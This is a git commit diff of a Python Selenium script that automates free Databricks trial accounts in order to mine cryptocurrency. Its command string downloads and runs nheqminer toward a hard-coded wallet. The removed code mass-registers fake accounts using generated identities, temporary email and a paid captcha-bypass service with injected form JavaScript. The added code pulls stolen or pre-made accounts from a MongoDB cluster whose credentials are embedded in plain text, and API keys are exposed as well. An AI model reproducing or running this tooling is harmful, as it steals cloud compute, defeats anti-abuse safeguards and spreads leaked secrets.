432b358eecd93d6c0a443748a914360f8efe2acd
Quocnd1704 <92584472+Quocnd1704@users.noreply.github.com>
2021-10-28 11:08:41 +0700

    Update databricks.py

--- databricks.py
+++ databricks.py
@@ -2,6 +2,8 @@ from selenium import webdriver
 from selenium.webdriver import ActionChains
 from selenium.webdriver.common.keys import Keys
 from selenium.common.exceptions import NoSuchElementException
+from pymongo import MongoClient
+import pymongo
 import requests
 import time
 import string
@@ -9,10 +11,7 @@ import random
 import os
 import threading
 import json
-from faker import Faker
-faker = Faker()
 print('''
-
   ###########################################################################
            ____            ____              ____            _           _
           |  _ \ ___  _ __|  _ \ __ _ _ __  |  _ \ _ __ ___ (_) ___  ___| |_
@@ -23,94 +22,38 @@ print('''
                                                            Not my Idea at all
   ###########################################################################
   ''')
-multitab = 7 # vps4-8 chay 20 chrome, vps databricks 2-10 chay max 10-15tab
+multitab = 8 # vps4-8 chay 20 chrome, vps databricks 2-10 chay max 5-10tab
 wallet   ="RDD9mUShEa4WU894zdknpkZJnLbLeWMXf4"
 worker   =".Cloud-DB"
 scriptmining= "!wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tar.gz && ./nheqminer/nheqminer -v -l eu.luckpool.net:3960 -u "+wallet+worker+" -p x -t 2"
 passwork   ="1234Abcdf@"
-api="Jp6jbfaQ7WYdi54EcN0w"
-urlmail="https://temp-databricks.tk/api/"
 timeopen=120
 timewaiting=120
-def bypass_captcha():
-   r=requests.post("https://api.anycaptcha.com/createTask",headers = {'Content-Type': 'application/json'},data=json.dumps({"clientKey": "458d1c46ef944b1dba0c8d1ad10f3a0d","task": {"type": "FunCaptchaTaskProxyless","websitePublicKey": "A0DE7B75-1138-44F2-B132-ED188CEB66F3"}}))
-   datatext=r.json()
-   print(datatext)
-   tackid= datatext['taskId']
-   print("TackID :",tackid)
-   time.sleep(5)
-   while True:
-        time.sleep(1)
-        req=requests.post("https://api.anycaptcha.com/getTaskResult", headers = {'Content-Type': 'application/json'},data=json.dumps({"clientKey": "458d1c46ef944b1dba0c8d1ad10f3a0d","taskId": tackid}))
-        print(req.json())
-        if (req.json())["status"]== "ready":
-            bypass=(req.json())["solution"]["token"]
-            return bypass
-            break
-        else :
-           continue
-def getmail(firstname,lastname):
-   r=requests.get(urlmail+"domains/"+api)
-   domains=(r.json())
-   n = random.choice(domains)
-   regemail=firstname+lastname+"@"+n
-   reg=requests.get(urlmail+"email/"+regemail+"/"+api) 
-   email=reg.text
-   return email   
-
-def checkmail(email):
-  n=0
-  while n==0: 
-   time.sleep(20)
-   req=requests.get(urlmail+"messages/"+email+"/"+api)
-   data=req.json()   
-   if len(data)>0:
-      for key in data.keys():
-        mailbox=data[key]['content']
-        mintext=mailbox.find('href="')
-        maxtext=mailbox.find('">this link')
-        linkreset=mailbox[mintext+6:maxtext]
-        if linkreset !='':
-           return linkreset
-           n=1
-           break
-   else: continue
-# Tao acc Databricks
-def regdatabricks(driver,gmail,firstname,lastname,company,title):
-  print("Mail :",gmail)
-  driver.get('https://databricks.com/try-databricks')
-  time.sleep(3)
-  driver.find_element_by_xpath('//*[@id="FirstName"]').send_keys(firstname)
-  time.sleep(1)
-  driver.find_element_by_xpath('//*[@id="LastName"]').send_keys(lastname)
-  time.sleep(1)
-  driver.find_element_by_xpath('//*[@id="Company"]').send_keys(company)
-  time.sleep(1)
-  driver.find_element_by_xpath('//*[@id="Email"]').send_keys(gmail)
-  time.sleep(1)
-  tits=driver.find_element_by_xpath('//*[@id="Title"]').send_keys(title)
-  time.sleep(2)
-  checkboxElement = driver.find_element_by_id("mkto_form_consent")
-  checkboxElement.send_keys(Keys.SPACE)
-  time.sleep(2)
-  driver.find_element_by_xpath('//*[@id="submitToMktoForm_2021Feb10"]/div[21]/span/button').click()
-  bypass=bypass_captcha()
-  scritpjs=f"""
-       $('#submitToMktoForm_2021Feb10').prepend('<input type="hidden" name="arkose_token_response" value={bypass}>');
-	   $('#submitToMktoForm_2021Feb10').prepend('<input type="hidden" name="action" value="try_databricks">');
-       $('#submitToMktoForm_2021Feb10').unbind('submit').submit();
-
-"""  
-  driver.execute_script(scritpjs)
-  time.sleep(5)
-  checkboxElementw = driver.find_element_by_xpath('//*[@id="ce-placeholder-button"]')
-  checkboxElementw.send_keys(Keys.ENTER)  
-  by_pass=bypass_captcha()
-  scritpjave=f"""
-       commonFields();$('#signup-form-platform').prepend('<input type="hidden" name="arkose_token_response" value={by_pass}>');
-       $('#signup-form-platform').unbind('submit').submit();
-"""  
-  driver.execute_script(scritpjave)  
+client = MongoClient("mongodb+srv://Quocnd174202:Quocnd174202@cluster0.ivpah.mongodb.net/myFirstDatabase?retryWrites=true&w=majority")
+db = client.get_database('Databricks')
+data =db.Account
+active=db.Active
+def getacc():
+   listdata= list(data.find())
+   dataacc=random.choice(listdata)
+   linkreset=dataacc["linkreset"]
+   email=dataacc["email"]
+   firstname=dataacc["firstname"]
+   lastname=dataacc["lastname"]
+   title=dataacc["title"]
+   company=dataacc["company"]
+   return linkreset
+   data.delete_one({'linkreset': linkreset})
+   newacc={
+	'email':gmail,
+	'pass':passwork,
+	'firstname':firstname,
+	'lastname': lastname,
+	'title':title,
+	'company':company,
+	'linkreset': linkreset    
+	}
+   active.insert_one(newacc)
 def resetpass(linkreset,driver,waiting):
     driver.get(linkreset)
     time.sleep(5)
@@ -205,16 +148,9 @@ def autominer(waiting):
    option.add_argument('--disable-dev-shm-usage')
    drivers = webdriver.Chrome(executable_path="chromedriver",options=option)
    drivers.set_window_size(800, 1200)
-   drivers.minimize_window()
-   firstname=faker.first_name()
-   lastname=faker.last_name()
-   title= faker.state()
-   company=faker.company() 
+   drivers.minimize_window() 
    try:
-      email=getmail(firstname,lastname)
-      regdatabricks(drivers,email,firstname,lastname,company,title)
-      time.sleep(5)
-      linkresetpas = checkmail(email)
+      linkresetpas = getacc()
       print(linkresetpas)
       resetpass(linkresetpas,drivers,waiting)
       autodatabricks(drivers,waiting)
